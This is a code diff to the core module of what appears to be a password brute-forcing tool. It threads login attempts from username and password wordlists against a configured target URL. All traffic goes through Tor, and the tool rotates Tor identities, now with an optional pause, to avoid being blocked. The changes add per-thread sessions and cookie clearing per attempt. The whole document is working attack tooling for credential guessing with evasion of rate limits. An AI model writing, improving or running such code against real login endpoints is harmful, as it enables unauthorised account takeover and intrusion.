@@ -4,10 +4,10 @@ import time
 from configparser import ConfigParser
 from multiprocessing import Lock, Condition
 from multiprocessing.pool import ThreadPool
+from threading import current_thread
 
 import requests
 from requests.exceptions import ConnectionError, Timeout
-from requests.adapters import HTTPAdapter
 from alive_progress import alive_bar
 
 from ..generator import PasswdGenerator, TupleGenerator
@@ -15,6 +15,11 @@ from ..onion import TorProxy
 from .cli_parser import Args
 
 __all__ = ["App"]
+
+
+def get_thread_id(name: str) -> int:
+    """Return the thread id from the thread name"""
+    return int(name.split("-")[1].split(" ")[0])
 
 
 class App:
@@ -25,13 +30,12 @@ class App:
 
         self.count = 0
         self.count_lock = Lock()
-        self.cookie_lock = Lock()
 
         self.logger = logging.getLogger(".".join(__name__.split(".")[1:]))
         self.cfg = ConfigParser()
         self.cfg.read(args.cfg_path)
 
-        self.session: requests.Session = None
+        self.sessions: dict[int, requests.Session] = {}
         self.target = re.compile(self.cfg["url-endpoints"]["target"])
         self.post_url = self.cfg["url-endpoints"]["post_url"]
 
@@ -45,25 +49,25 @@ class App:
         self.timeout = args.timeout
         self.max_tries = args.max_tries
         self.max_workers = args.threads
+        self.sleep = args.sleep
+        self.use_all = args.use_all
 
-    def __del__(self) -> None:
-        try:
-            self.session.close()
-        except:  # noqa
-            pass
-
-    def post_search(self, username_field: str, password_field: str) -> bool:
+    def post_search(self, pport: int, username_field: str, password_field: str) -> bool:
         response: requests.Response = None
         last_exception: str = None
         try_no = 0
+
+        session = self.sessions.get(tid := get_thread_id(name := current_thread().name))
+        if not session:
+            session = self.build_session(pport)
+            self.sessions.update({tid: session})
+            self.logger.debug("new session for %s", name)
 
         # 3 tries to connect to the target
         # connected if some response and status code is 200
         while try_no < self.max_tries and (not response or response.status_code != 200):
             try:
-                with self.cookie_lock:
-                    self.session.cookies.clear()
-                response = self.session.post(
+                response = session.post(
                     self.post_url,
                     data={
                         self.username_field: username_field,
@@ -72,6 +76,7 @@ class App:
                     allow_redirects=True,  # maybe new page when successfull login
                     timeout=self.timeout,  # 10 secondes by default
                 )
+                session.cookies.clear()
                 if response and response.status_code == 200:
                     with self.lock:
                         self.consecutive_fails = 0
@@ -105,29 +110,20 @@ class App:
                 password_field,
             )
 
-    def rebuild_session(self, port: int):
-        if self.session:
-            self.session.close()
-            del self.session
-        self.session = requests.Session()
-        self.session.mount(
-            "http://",
-            HTTPAdapter(
-                pool_maxsize=self.max_workers,
-                pool_connections=self.max_workers,
-            ),
-        )
-        self.session.mount(
-            "https://",
-            HTTPAdapter(
-                pool_maxsize=self.max_workers,
-                pool_connections=self.max_workers,
-            ),
-        )
-        self.session.proxies = {
-            "http": f"socks5h://localhost:{port}",  # use Tor for HTTP connections
-            "https": f"socks5h://localhost:{port}",  # use Tor for HTTPS connections
+    def build_session(self, pport: int) -> requests.Session:
+        """Build a new session with the new port"""
+        session = requests.Session()
+        session.proxies = {
+            "http": f"socks5h://localhost:{pport}",  # use Tor for HTTP connections
+            "https": f"socks5h://localhost:{pport}",  # use Tor for HTTPS connections
         }
+        return session
+
+    def del_sessions(self):
+        """delete all sessions"""
+        for session in self.sessions.values():
+            session.close()
+        self.sessions.clear()
 
     def bar(self, bar, digits: int, user_count: int, passwd_count: int, /):
         should_update_title = False  # do we change user ?
@@ -165,8 +161,8 @@ class App:
         return f"on user {(i+1):0{digits}}/{user_count}"
 
     def run(self):
-        user = PasswdGenerator(self.username_path, self.it_comb[0])
-        passwd = PasswdGenerator(self.password_path, self.it_comb[1])
+        user = PasswdGenerator(self.username_path, self.it_comb[0], self.use_all)
+        passwd = PasswdGenerator(self.password_path, self.it_comb[1], self.use_all)
         generator = TupleGenerator(user, passwd)
 
         digits = len(str(user.count))  # number of digits in user count
@@ -177,7 +173,7 @@ class App:
 
         def on_each():
             """setup session and bar title"""
-            self.rebuild_session(tor.port)
+            self.del_sessions()
             bar.title(self.bar_title(self.count // passwd.count, digits, user.count))
 
         # fmt: off
@@ -198,17 +194,18 @@ class App:
                         # swap Tor identity
                         bar.title(f"ID Swap ♻️{' '*(length-9)}")  # 9 = len("ID Swap ♻️")
                         tor.identity_swap()
+                        if self.sleep > 0:
+                            time.sleep(self.sleep)
 
                     on_each()
 
                 # apply new tasks to thread pool
                 pool.apply_async(
                     self.post_search,
-                    args=(u[0], u[1]),
+                    args=(tor.port, u[0], u[1]),
                     callback=lambda _: self.bar(bar, digits, user.count, passwd.count),
                 )
             pool.close()
             pool.join()
 
         self.logger.info("Done ✅")
-        self.session.close()
